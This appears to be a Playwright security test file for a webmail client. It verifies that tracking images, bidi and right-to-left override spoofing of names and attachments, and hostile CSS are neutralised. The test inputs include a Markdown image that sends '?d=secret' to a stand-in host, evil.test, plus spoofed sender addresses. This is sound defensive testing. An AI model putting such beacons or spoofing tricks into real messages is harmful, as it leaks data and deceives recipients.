// Hostile mail in the reader and the composer. The seed adds
// the messages with MAILR_E2E_HOSTILE=1 and --extras (backend mailr/dev/e2e.py _hostile_extras).
// Run in Chromium and Firefox: npx playwright test security-content --browser=chromium|firefox
import type { Page } from '@playwright/test'
import { connectCalendar, expect, test } from './fixtures'
import { openConversation } from './helpers'

test.use({ extras: true })
test.beforeAll(() => {
  process.env.MAILR_E2E_HOSTILE = '1'
})
test.afterAll(() => {
  delete process.env.MAILR_E2E_HOSTILE
})

/** The inbox row of a conversation, as the list shows it. */
async function rowText(page: Page, subject: string): Promise<string> {
  await page.goto('/mail/inbox')
  const row = page.locator('[data-mail-list] [role="row"]').filter({ hasText: subject }).first()
  await expect(row).toBeVisible()
  return (await row.textContent()) ?? ''
}

const open = (page: Page, subject: string) => openConversation(page, subject)

const BIDI = /[\u202a-\u202e\u2066-\u2069]/

/** Requests the page makes to any host but the local stack. */
function remoteRequests(page: Page): string[] {
  const out: string[] = []
  page.on('request', (r) => {
    const host = new URL(r.url()).hostname
    if (!['localhost', '127.0.0.1'].includes(host)) out.push(r.url())
  })
  return out
}

test('Forward and Reply with the trimmed quote load no remote image', async ({ page }) => {
  const remote = remoteRequests(page)
  // "Ask" (the sender is not trusted): the reader blocks the image, and so does the quote.
  expect((await page.request.patch('/api/v1/me/settings', { data: { images: 'ask' } })).ok()).toBeTruthy()
  await open(page, 'SEC forward leak')
  await page.locator('.reply-bar').getByRole('button', { name: 'Forward' }).click()
  const fwd = page.locator('[data-inline-reply]')
  await expect(fwd).toContainText('Quarterly numbers attached')
  // The image is a placeholder that keeps its address for the outgoing mail.
  const img = fwd.locator('.mail-img.blocked img')
  await expect(img).toHaveCount(1)
  await expect(img).toHaveAttribute('alt', 'chart')
  await expect(img).not.toHaveAttribute('src', /evil\.test/)
  await page.waitForTimeout(500)
  expect(remote).toEqual([])

  await open(page, 'SEC forward leak')
  await page.locator('.reply-bar').getByRole('button', { name: 'Reply', exact: true }).click()
  const reply = page.locator('[data-inline-reply]')
  await reply.getByRole('button', { name: 'Show trimmed content' }).click()
  await expect(reply).toContainText('Quarterly numbers attached')
  await page.waitForTimeout(500)
  expect(remote).toEqual([])
  // The changed reply is saved when it is left (live editing): discard it, so the reply bar is back.
  await reply.getByRole('button', { name: 'Discard draft' }).click()
  await expect(reply).toHaveCount(0)

  // "Always": the reader shows images through mailr's proxy, and the quote does the same.
  expect((await page.request.patch('/api/v1/me/settings', { data: { images: 'always' } })).ok()).toBeTruthy()
  await open(page, 'SEC forward leak')
  await page.locator('.reply-bar').getByRole('button', { name: 'Forward' }).click()
  await expect(page.locator('[data-inline-reply]')).toContainText('Quarterly numbers attached')
  await expect(page.locator('[data-inline-reply] img[src*="evil.test"]')).toHaveCount(0)
  await page.waitForTimeout(500)
  expect(remote).toEqual([])
})

test('a bidi override in the name cannot reverse the address', async ({ page }) => {
  for (const subject of ['SEC bidi name', 'SEC bidi legacy']) {
    await open(page, subject)
    const head = page.getByRole('article').locator('.msg-head .who').first()
    await expect(head.locator('.email')).toHaveText('<bob@evil.test>')
    const name = await head.locator('.name').textContent()
    expect(name).not.toMatch(BIDI)
    // The list row too.
    expect(await rowText(page, subject)).not.toMatch(BIDI)
  }
})

test('a display name that is another address shows the real one and a warning', async ({ page }) => {
  await open(page, 'SEC address name')
  await expect(page.getByTestId('sender-warning')).toContainText('x@evil.test')
  expect(await rowText(page, 'SEC address name')).toContain('x@evil.test')
})

test('an RTLO attachment name shows its real extension and a warning', async ({ page }) => {
  await open(page, 'SEC rtlo attachment')
  const card = page.locator('.att-card').first()
  await expect(card.getByTestId('att-name')).toHaveText('invoicefdp.exe')
  await expect(card.locator('.foot .att-risky')).toBeVisible()
  await expect(card.locator('.att-warning')).toBeVisible()
})

test('the email stylesheet cannot show the trimmed quote or overlay the frame', async ({ page }) => {
  await open(page, 'SEC quote unhide')
  const frame = page.frameLocator('iframe[title="Message body"]').last()
  await expect(frame.locator('body')).toContainText('Thanks for the update')
  await expect(frame.locator('body')).not.toContainText('SECRET-QUOTE-TEXT')
  const pos = await frame.locator('p').first().evaluate((el) => getComputedStyle(el).position)
  expect(pos).toBe('static')
  await page.getByRole('button', { name: 'Show trimmed content' }).first().click()
  await expect(frame.locator('body')).toContainText('SECRET-QUOTE-TEXT')
  await page.getByRole('button', { name: 'Hide trimmed content' }).first().click()
  await expect(frame.locator('body')).not.toContainText('SECRET-QUOTE-TEXT')
})

test('task notes written from mail never load a Markdown image', async ({ page, seeded }) => {
  await connectCalendar(page.request, seeded)
  const remote = remoteRequests(page)
  const r = await page.request.post('/api/v1/tasks', { data: { summary: 'SEC notes image', notes: 'See ![chart](https://evil.test/notes.png?d=secret)' } })
  expect(r.ok(), await r.text()).toBeTruthy()
  const t = (await r.json()) as { uid: string }
  await page.goto(`/tasks/all/task/${encodeURIComponent(t.uid)}`)
  const preview = page.getByTestId('task-pane').locator('.tk-notes-preview')
  await expect(preview).toContainText('[image: chart]')
  await expect(preview.locator('img')).toHaveCount(0)
  await page.waitForTimeout(500)
  expect(remote).toEqual([])
})
